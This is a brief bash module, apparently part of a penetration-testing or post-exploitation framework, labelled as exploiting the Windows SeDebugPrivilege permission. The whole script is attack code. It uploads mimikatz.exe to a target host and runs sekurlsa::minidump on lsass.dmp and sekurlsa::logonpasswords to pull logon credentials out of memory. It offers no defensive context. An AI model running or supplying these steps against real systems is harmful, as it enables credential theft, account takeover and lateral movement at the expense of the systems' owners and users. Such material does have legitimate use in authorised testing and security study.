#!/bin/bash

: '
exploit SeDebugPrivilege permission
'

LOCATION="${SCRIPTS_DIR}/reconnaissance/windows/permissions/SeDebugPrivilege/.files"
FILE="mimikatz.exe"

ps_webclient_upload_file "${LOCATION}" "${FILE}"

execute_command "${FILE_LOCATION} -Command '"log" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"' exit"
create_new_line 
